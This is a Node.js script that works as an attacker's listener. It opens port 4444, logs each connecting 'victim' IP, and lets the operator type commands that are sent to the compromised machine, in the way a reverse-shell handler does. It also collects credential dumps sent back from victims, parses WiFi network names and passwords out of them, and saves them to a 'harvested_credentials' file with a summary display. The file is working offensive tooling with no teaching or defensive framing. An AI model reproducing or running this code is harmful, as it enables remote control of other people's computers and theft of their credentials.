const net = require('net');
const fs = require('fs');
const readline = require('readline');

const PORT = 4444;
const LOG_FILE = 'credentials_log.txt';
const CRED_FILE = 'harvested_credentials.json';

let currentSocket = null;
let credentialData = {};

// Create readline interface for user input
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Colors for terminal output
const colors = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m'
};

function colorLog(message, color = 'reset') {
    console.log(colors[color] + message + colors.reset);
}

function parseCredentials(data) {
    const lines = data.split('\n');
    const credentials = {
        system: {},
        wifi: [],
        browsers: {},
        registry: []
    };

    let currentSection = null;
    
    lines.forEach(line => {
        if (line.includes('SSID:') && line.includes('Password:')) {
            const match = line.match(/SSID:\s*(.+?)\s*\|\s*Password:\s*(.+)/);
            if (match) {
                credentials.wifi.push({
                    ssid: match[1].trim(),
                    password: match[2].trim()
                });
            }
        }
        
        if (line.includes('whoami')) currentSection = 'user';
        if (line.includes('hostname')) currentSection = 'hostname';
        if (line.includes('OS Name')) currentSection = 'os';
    });
    
    return credentials;
}

const server = net.createServer((socket) => {
    colorLog(`\n[+] Client connected: ${socket.remoteAddress}:${socket.remotePort}`, 'green');
    colorLog('[+] Victim IP: ' + socket.remoteAddress, 'cyan');
    currentSocket = socket;
    
    // Log all communications
    const logStream = fs.createWriteStream(LOG_FILE, { flags: 'a' });
    logStream.write(`\n=== New session started at ${new Date()} ===\n`);
    logStream.write(`Client: ${socket.remoteAddress}:${socket.remotePort}\n`);
    
    let dataBuffer = '';
    
    socket.on('data', (data) => {
        const output = data.toString();
        dataBuffer += output;
        
        // Display with colors
        if (output.includes('[+]')) {
            colorLog(output.trim(), 'green');
        } else if (output.includes('SSID:')) {
            colorLog(output.trim(), 'yellow');
        } else if (output.includes('===')) {
            colorLog(output.trim(), 'magenta');
        } else if (output.includes('---')) {
            colorLog(output.trim(), 'blue');
        } else {
            process.stdout.write(output);
        }
        
        logStream.write(output);
        
        // Parse and save credentials
        if (output.includes('CREDENTIAL HARVESTING COMPLETED')) {
            const parsedCreds = parseCredentials(dataBuffer);
            credentialData[socket.remoteAddress] = {
                timestamp: new Date(),
                credentials: parsedCreds,
                rawData: dataBuffer
            };
            
            // Save to file
            fs.writeFileSync(CRED_FILE, JSON.stringify(credentialData, null, 2));
            colorLog('\n[+] Credentials saved to ' + CRED_FILE, 'green');
            
            // Display summary
            displayCredentialSummary(parsedCreds);
        }
    });
    
    socket.on('close', () => {
        colorLog('\n[-] Client disconnected', 'red');
        logStream.write(`\n=== Session ended at ${new Date()} ===\n`);
        logStream.end();
        currentSocket = null;
    });
    
    socket.on('error', (err) => {
        colorLog('Socket error: ' + err.message, 'red');
    });
});

function displayCredentialSummary(creds) {
    colorLog('\n' + '='.repeat(50), 'magenta');
    colorLog('           CREDENTIAL SUMMARY', 'magenta');
    colorLog('='.repeat(50), 'magenta');
    
    if (creds.wifi && creds.wifi.length > 0) {
        colorLog('\n[WiFi Credentials Found]', 'yellow');
        creds.wifi.forEach(wifi => {
            colorLog(`  SSID: ${wifi.ssid}`, 'cyan');
            colorLog(`  Password: ${wifi.password}`, 'green');
            colorLog('  ---', 'blue');
        });
    }
    
    colorLog('\n' + '='.repeat(50), 'magenta');
}

// Handle user input
rl.on('line', (input) => {
    if (input.toLowerCase() === 'show creds') {
        if (Object.keys(credentialData).length > 0) {
            colorLog('\n[Stored Credentials]', 'yellow');
            console.log(JSON.stringify(credentialData, null, 2));
        } else {
            colorLog('No credentials harvested yet', 'red');
        }
        return;
    }
    
    if (input.toLowerCase() === 'clear') {
        console.clear();
        return;
    }
    
    if (currentSocket && !currentSocket.destroyed) {
        currentSocket.write(input + '\n');
    } else {
        colorLog('No active connection', 'red');
    }
});

server.listen(PORT, '0.0.0.0', () => {
    colorLog(`[*] Enhanced Credential Listener started on 0.0.0.0:${PORT}`, 'green');
    colorLog('[*] Waiting for connections...', 'cyan');
    colorLog('[*] Commands: "show creds" to display harvested credentials', 'yellow');
    colorLog('[*] Commands: "clear" to clear screen', 'yellow');
    colorLog('[*] Press Ctrl+C to exit', 'yellow');
});

server.on('error', (err) => {
    colorLog('Server error: ' + err.message, 'red');
});

// Graceful shutdown
process.on('SIGINT', () => {
    colorLog('\n[*] Shutting down server...', 'yellow');
    server.close();
    rl.close();
    process.exit(0);
});